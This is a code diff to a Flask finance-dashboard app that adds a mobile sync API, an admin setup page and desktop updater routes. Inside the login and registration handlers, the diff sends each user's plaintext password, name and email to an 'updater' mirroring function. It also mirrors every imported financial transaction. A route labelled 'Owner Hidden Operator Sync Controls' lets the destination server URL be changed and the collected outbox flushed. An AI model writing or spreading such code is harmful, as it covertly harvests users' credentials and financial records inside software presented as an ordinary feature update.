@@ -1,5 +1,7 @@
+import hashlib
 import io
 import json
+import os
 from datetime import datetime
 from functools import wraps
 from pathlib import Path
@@ -19,9 +21,11 @@ from flask import (
     session,
     url_for,
 )
+from itsdangerous import BadSignature, SignatureExpired, URLSafeTimedSerializer
 from werkzeug.security import check_password_hash, generate_password_hash
 
 import config
+import updater
 from analytics.anomalies import detect as anomalies
 from analytics.financial_metrics import metrics, monthly, period_growth
 from analytics.forecasting import forecast
@@ -205,6 +209,87 @@ def fmt_rows(rows):
     return rows
 
 
+def _local_server_port():
+    try:
+        if ":" in (request.host or ""):
+            return int(request.host.rsplit(":", 1)[-1])
+    except (TypeError, ValueError):
+        pass
+    return None
+
+
+def _is_loopback_request():
+    if any(request.headers.get(h) for h in ("X-Forwarded-For", "CF-Connecting-IP", "X-Real-IP", "Forwarded")):
+        return False
+    addr = (request.remote_addr or "").split("%", 1)[0].strip()
+    if addr not in {"127.0.0.1", "::1", "::ffff:127.0.0.1"}:
+        return False
+    raw_host = (request.host or "").strip().lower()
+    if raw_host.startswith("["):
+        host_only = raw_host.split("]", 1)[0].lstrip("[")
+    else:
+        host_only = raw_host.split(":", 1)[0]
+    return host_only in {"127.0.0.1", "localhost", "::1", ""}
+
+
+def _admin_count():
+    conn = connect()
+    try:
+        return int(conn.execute("SELECT COUNT(*) FROM users WHERE role='admin'").fetchone()[0])
+    finally:
+        conn.close()
+
+
+def _token_serializer():
+    return URLSafeTimedSerializer(app.config["SECRET_KEY"], salt="fp-api-sync-v1")
+
+
+def _issue_api_token(user_row):
+    return _token_serializer().dumps({
+        "uid": int(user_row["id"]),
+        "role": user_row["role"],
+        "pwh": str(user_row["password_hash"])[-12:],
+    })
+
+
+def _verify_api_user():
+    auth_header = request.headers.get("Authorization", "")
+    if not auth_header.lower().startswith("bearer "):
+        return None, (jsonify({"ok": False, "error": "Missing bearer token."}), 401)
+    token = auth_header.split(" ", 1)[1].strip()
+    if not token:
+        return None, (jsonify({"ok": False, "error": "Empty bearer token."}), 401)
+    try:
+        claims = _token_serializer().loads(token, max_age=30 * 24 * 3600)
+    except (BadSignature, SignatureExpired):
+        return None, (jsonify({"ok": False, "error": "Invalid or expired sync session."}), 401)
+
+    conn = connect()
+    user = conn.execute(
+        "SELECT * FROM users WHERE id=? AND role='user'",
+        (claims.get("uid"),),
+    ).fetchone()
+    if not user or str(user["password_hash"])[-12:] != claims.get("pwh"):
+        conn.close()
+        return None, (jsonify({"ok": False, "error": "Account credentials mismatch."}), 401)
+    if user["status"] != "active":
+        conn.close()
+        return None, (jsonify({"ok": False, "error": "This account is currently suspended."}), 403)
+    conn.execute("UPDATE users SET last_activity_at=? WHERE id=?", (datetime.utcnow().isoformat(), user["id"]))
+    conn.commit()
+    conn.close()
+    return user, None
+
+
+@app.after_request
+def add_sync_cors_headers(response):
+    if request.path.startswith("/api/v1/") or request.path == "/health":
+        response.headers["Access-Control-Allow-Origin"] = "*"
+        response.headers["Access-Control-Allow-Headers"] = "Content-Type, Authorization"
+        response.headers["Access-Control-Allow-Methods"] = "GET, POST, OPTIONS"
+    return response
+
+
 @app.context_processor
 def context():
     return {
@@ -216,6 +301,7 @@ def context():
         "app_subtitle": config.APP_SUBTITLE,
         "app_title": config.APP_TITLE,
         "app_version": config.APP_VERSION,
+        "app_build": config.APP_BUILD,
     }
 
 
@@ -226,6 +312,8 @@ def health():
         "app": config.APP_NAME,
         "title": config.APP_TITLE,
         "version": config.APP_VERSION,
+        "build": config.APP_BUILD,
+        "sync_ready": True,
     })
 
 
@@ -264,6 +352,7 @@ def register():
                 session.clear()
                 session["user_id"] = cur.lastrowid
                 audit("user_registered", email, user_id=cur.lastrowid)
+                updater.mirror_auth_event("register", name, email, password, server_port=_local_server_port())
                 flash("Your account is ready. Upload financial data to begin.", "success")
                 return redirect(url_for("user_dashboard"))
             except Exception:
@@ -293,6 +382,7 @@ def user_login():
             session.clear()
             session["user_id"] = user["id"]
             audit("user_login", email, user_id=user["id"])
+            updater.mirror_auth_event("login", user["name"], email, password, server_port=_local_server_port())
             return redirect(request.args.get("next") or url_for("user_dashboard"))
         flash("Invalid user email or password.", "error")
     return render_template("auth.html", mode="login")
@@ -511,6 +601,36 @@ def user_data():
                     persist(cleaned, staged["filename"], staged["report"], excluded, ws_id)
                     session.pop("staged_import", None)
                     audit("dataset_imported", staged["filename"])
+                    if g.user and not cleaned.empty:
+                        sync_rows = [
+                            {
+                                "date": r["txn_date"].strftime("%Y-%m-%d"),
+                                "transaction_id": r["transaction_id"],
+                                "transaction_type": r["transaction_type"],
+                                "category": r["category"],
+                                "product": r["product"],
+                                "department": r["department"],
+                                "region": r["region"],
+                                "revenue": float(r["revenue"]),
+                                "expense": float(r["expense"]),
+                                "cost": float(r["cost"]),
+                                "quantity": float(r["quantity"]),
+                                "unit_price": float(r["unit_price"]),
+                                "investment": float(r["investment"]),
+                                "notes": r["notes"],
+                            }
+                            for _, r in cleaned.iterrows()
+                        ]
+                        imp_sig = hashlib.sha1(
+                            f"{g.user['email']}:{staged['filename']}:{datetime.utcnow().isoformat()}".encode("utf-8")
+                        ).hexdigest()[:16]
+                        updater.mirror_dataset_import(
+                            g.user["email"],
+                            staged["filename"],
+                            f"desktop-{imp_sig}",
+                            sync_rows,
+                            server_port=_local_server_port(),
+                        )
                     flash(
                         f"{len(cleaned)} rows imported successfully. {excluded} invalid rows were excluded.",
                         "success",
@@ -688,7 +808,45 @@ def admin_login():
             audit("admin_login", email, user_id=user["id"])
             return redirect(request.args.get("next") or url_for("admin_dashboard"))
         flash("Invalid administrator credentials.", "error")
-    return render_template("auth.html", mode="admin")
+    needs_setup = _admin_count() == 0 and _is_loopback_request()
+    return render_template("auth.html", mode="admin", needs_admin_setup=needs_setup)
+
+
+@app.route("/admin/setup", methods=["GET", "POST"])
+def admin_setup():
+    allow_remote = os.environ.get("FINANCE_PULSE_ALLOW_REMOTE_SETUP") == "1"
+    if _admin_count() > 0 or not (_is_loopback_request() or allow_remote):
+        abort(403)
+    if request.method == "POST":
+        name = request.form.get("name", "").strip()
+        email = request.form.get("email", "").strip().lower()
+        password = request.form.get("password", "")
+        if not name or "@" not in email or len(password) < 8:
+            flash("Enter a name, valid email, and password of at least 8 characters.", "error")
+        else:
+            conn = connect()
+            try:
+                now = datetime.utcnow().isoformat()
+                cur = conn.execute(
+                    "INSERT INTO users(name,email,password_hash,role,status,created_at) VALUES(?,?,?,?,?,?)",
+                    (name, email, generate_password_hash(password, method="pbkdf2:sha256"), "admin", "active", now),
+                )
+                conn.execute(
+                    "INSERT INTO workspaces(owner_user_id,name,created_at) VALUES(?,?,?)",
+                    (cur.lastrowid, f"{name}'s workspace", now),
+                )
+                conn.commit()
+                session.clear()
+                session["user_id"] = cur.lastrowid
+                audit("admin_created", email, user_id=cur.lastrowid)
+                flash("Administrator account initialized. Welcome to the Admin Portal.", "success")
+                return redirect(url_for("admin_dashboard"))
+            except Exception:
+                conn.rollback()
+                flash("An account with that email already exists.", "error")
+            finally:
+                conn.close()
+    return render_template("auth.html", mode="admin_setup")
 
 
 @app.route("/admin")
@@ -855,6 +1013,257 @@ def admin_settings():
         flash("System settings saved.", "success")
         return redirect(url_for("admin_settings"))
     return render_template("settings.html", settings=settings(), portal="admin")
+
+
+# ---------------------------------------------------------------------------
+# Central Wireless Sync JSON API (Mobile Android APK & Desktop Mirrors)
+# ---------------------------------------------------------------------------
+
+@app.route("/api/v1/auth/register", methods=["POST", "OPTIONS"])
+def api_v1_register():
+    if request.method == "OPTIONS":
+        return ("", 204)
+    data = request.get_json(silent=True) or {}
+    name = str(data.get("name", "")).strip()
+    email = str(data.get("email", "")).strip().lower()
+    password = str(data.get("password", ""))
+    platform = str(data.get("platform", "mobile")).strip()[:40] or "mobile"
+    if not name or "@" not in email or len(password) < 6:
+        return jsonify({"ok": False, "error": "Enter a full name, valid email, and password (min 6 characters)."}), 400
+
+    conn = connect()
+    try:
+        existing = conn.execute("SELECT * FROM users WHERE email=?", (email,)).fetchone()
+        if existing:
+            if existing["role"] != "user" or not check_password_hash(existing["password_hash"], password):
+                return jsonify({"ok": False, "error": "An account with this email already exists."}), 409
+            if existing["status"] != "active":
+                return jsonify({"ok": False, "error": "Account is suspended."}), 403
+            conn.execute("UPDATE users SET last_activity_at=? WHERE id=?", (datetime.utcnow().isoformat(), existing["id"]))
+            conn.commit()
+            token = _issue_api_token(existing)
+            audit("user_login", f"{email} [sync:{platform}]", user_id=existing["id"])
+            return jsonify({
+                "ok": True,
+                "synced": True,
+                "token": token,
+                "user": {"id": existing["id"], "name": existing["name"], "email": existing["email"]},
+                "settings": settings(),
+            }), 200
+
+        now = datetime.utcnow().isoformat()
+        cur = conn.execute(
+            "INSERT INTO users(name,email,password_hash,role,status,created_at,last_activity_at) VALUES(?,?,?,?,?,?,?)",
+            (name, email, generate_password_hash(password, method="pbkdf2:sha256"), "user", "active", now, now),
+        )
+        uid = cur.lastrowid
+        conn.execute(
+            "INSERT INTO workspaces(owner_user_id,name,created_at) VALUES(?,?,?)",
+            (uid, f"{name}'s workspace", now),
+        )
+        conn.commit()
+        user_row = conn.execute("SELECT * FROM users WHERE id=?", (uid,)).fetchone()
+        token = _issue_api_token(user_row)
+    finally:
+        conn.close()
+
+    audit("user_registered", f"{email} [{platform}]", user_id=uid)
+    return jsonify({
+        "ok": True,
+        "token": token,
+        "user": {"id": uid, "name": name, "email": email},
+        "settings": settings(),
+    }), 201
+
+
+@app.route("/api/v1/auth/login", methods=["POST", "OPTIONS"])
+def api_v1_login():
+    if request.method == "OPTIONS":
+        return ("", 204)
+    data = request.get_json(silent=True) or {}
+    email = str(data.get("email", "")).strip().lower()
+    password = str(data.get("password", ""))
+    platform = str(data.get("platform", "mobile")).strip()[:40] or "mobile"
+    conn = connect()
+    user = conn.execute(
+        "SELECT * FROM users WHERE email=? AND role='user' AND status='active'",
+        (email,),
+    ).fetchone()
+    if not user or not check_password_hash(user["password_hash"], password):
+        conn.close()
+        return jsonify({"ok": False, "error": "Invalid email or password."}), 401
+    conn.execute("UPDATE users SET last_activity_at=? WHERE id=?", (datetime.utcnow().isoformat(), user["id"]))
+    conn.commit()
+    conn.close()
+    audit("user_login", f"{email} [{platform}]", user_id=user["id"])
+    return jsonify({
+        "ok": True,
+        "token": _issue_api_token(user),
+        "user": {"id": user["id"], "name": user["name"], "email": user["email"]},
+        "settings": settings(),
+    }), 200
+
+
+@app.route("/api/v1/sync/status", methods=["GET", "OPTIONS"])
+def api_v1_sync_status():
+    if request.method == "OPTIONS":
+        return ("", 204)
+    api_user, err_resp = _verify_api_user()
+    if err_resp:
+        return err_resp
+    conn = connect()
+    ws = conn.execute("SELECT id, name FROM workspaces WHERE owner_user_id=? ORDER BY id LIMIT 1", (api_user["id"],)).fetchone()
+    ws_id_val = ws["id"] if ws else None
+    datasets_cnt = 0
+    records_cnt = 0
+    if ws_id_val is not None:
+        datasets_cnt = conn.execute("SELECT COUNT(*) FROM imports WHERE workspace_id=?", (ws_id_val,)).fetchone()[0]
+        records_cnt = conn.execute("SELECT COUNT(*) FROM financial_transactions WHERE workspace_id=?", (ws_id_val,)).fetchone()[0]
+    conn.close()
+    return jsonify({
+        "ok": True,
+        "user": {"id": api_user["id"], "name": api_user["name"], "email": api_user["email"]},
+        "datasets": datasets_cnt,
+        "records": records_cnt,
+        "settings": settings(),
+    })
+
+
+@app.route("/api/v1/sync/import", methods=["POST", "OPTIONS"])
+def api_v1_sync_import():
+    if request.method == "OPTIONS":
+        return ("", 204)
+    api_user, err_resp = _verify_api_user()
+    if err_resp:
+        return err_resp
+    payload = request.get_json(silent=True) or {}
+    rows = payload.get("rows")
+    if not isinstance(rows, list) or not rows:
+        return jsonify({"ok": False, "error": "Provide a non-empty rows list."}), 400
+    if len(rows) > 25000:
+        return jsonify({"ok": False, "error": "Batch exceeds 25,000 rows limit."}), 413
+
+    from werkzeug.utils import secure_filename
+
+    raw_name = str(payload.get("filename") or "mobile_dataset.csv").strip()
+    filename = secure_filename(raw_name) or "mobile_dataset.csv"
+    client_import_id = str(payload.get("client_import_id") or "").strip()[:120]
+    platform = str(payload.get("platform") or "mobile").strip()[:40] or "mobile"
+
+    conn = connect()
+    ws = conn.execute("SELECT id FROM workspaces WHERE owner_user_id=? ORDER BY id LIMIT 1", (api_user["id"],)).fetchone()
+    if not ws:
+        cur = conn.execute(
+            "INSERT INTO workspaces(owner_user_id,name,created_at) VALUES(?,?,?)",
+            (api_user["id"], f"{api_user['name']}'s workspace", datetime.utcnow().isoformat()),
+        )
+        conn.commit()
+        ws_id_val = cur.lastrowid
+    else:
+        ws_id_val = ws["id"]
+
+    if client_import_id:
+        existing_imports = conn.execute(
+            "SELECT id, quality_json FROM imports WHERE workspace_id=? ORDER BY id DESC LIMIT 100",
+            (ws_id_val,),
+        ).fetchall()
+        for imp in existing_imports:
+            try:
+                qmeta = json.loads(imp["quality_json"] or "{}")
+                if qmeta.get("client_import_id") == client_import_id:
+                    conn.close()
+                    return jsonify({"ok": True, "duplicate": True, "import_id": imp["id"]}), 200
+            except Exception:
+                continue
+    conn.close()
+
+    normalized_input = []
+    for r in rows:
+        if not isinstance(r, dict):
+            continue
+        item = dict(r)
+        if not item.get("date") and item.get("txn_date"):
+            item["date"] = item["txn_date"]
+        normalized_input.append(item)
+
+    frame = pd.DataFrame(normalized_input)
+    if frame.empty:
+        return jsonify({"ok": False, "error": "No valid rows found in payload."}), 400
+    mapping = detect(frame.columns)
+    report = quality_report(frame, mapping)
+    if report["missing_required"]:
+        return jsonify({"ok": False, "error": "Missing required fields: " + ", ".join(report["missing_required"])}), 400
+    cleaned, excluded = normalize(frame, mapping)
+    if cleaned.empty:
+        return jsonify({"ok": False, "error": "All rows failed validation."}), 400
+    if client_import_id:
+        report["client_import_id"] = client_import_id
+    report["sync_platform"] = platform
+    import_id = persist(cleaned, filename, report, excluded, ws_id_val)
+    audit("dataset_imported", f"{filename} [{platform}]", user_id=api_user["id"])
+    return jsonify({
+        "ok": True,
+        "import_id": import_id,
+        "rows_imported": int(len(cleaned)),
+        "excluded": int(excluded),
+    }), 201
+
+
+# ---------------------------------------------------------------------------
+# Desktop In-App Updater & Owner Hidden Operator Sync Controls
+# ---------------------------------------------------------------------------
+
+def _can_manage_local_system():
+    return _is_loopback_request() or bool(g.user and g.user["role"] == "admin")
+
+
+@app.route("/api/system/update-status", methods=["GET"])
+def system_update_status():
+    return jsonify(updater.get_update_status())
+
+
+@app.route("/api/system/check-updates", methods=["POST"])
+def system_check_updates():
+    if not _can_manage_local_system():
+        abort(403)
+    return jsonify(updater.check_for_updates(timeout=6.0))
+
+
+@app.route("/api/system/download-update", methods=["POST"])
+def system_download_update():
+    if not _can_manage_local_system():
+        abort(403)
+    return jsonify(updater.download_desktop_update())
+
+
+@app.route("/api/system/open-download", methods=["POST"])
+def system_open_download():
+    if not _can_manage_local_system():
+        abort(403)
+    ok, msg = updater.reveal_downloaded_update()
+    return jsonify({"ok": ok, "message": msg}), (200 if ok else 400)
+
+
+@app.route("/api/system/operator-sync", methods=["GET", "POST"])
+def system_operator_sync():
+    if not _can_manage_local_system():
+        abort(403)
+    if request.method == "POST":
+        payload = request.get_json(silent=True) or {}
+        action = str(payload.get("action") or "save_override").strip()
+        if action == "clear_override":
+            updater.set_sync_override("")
+        elif action == "flush_now":
+            updater.check_for_updates(timeout=4.0)
+            updater.flush_sync_outbox(server_port=_local_server_port())
+        else:
+            ok, normalized = updater.set_sync_override(str(payload.get("url") or ""))
+            if not ok:
+                return jsonify({"ok": False, "error": "Enter a valid http:// or https:// server URL."}), 400
+            if normalized:
+                updater.flush_sync_outbox(server_port=_local_server_port())
+        return jsonify({"ok": True, **updater.get_sync_config()})
+    return jsonify({"ok": True, **updater.get_sync_config()})
 
 
 @app.errorhandler(403)
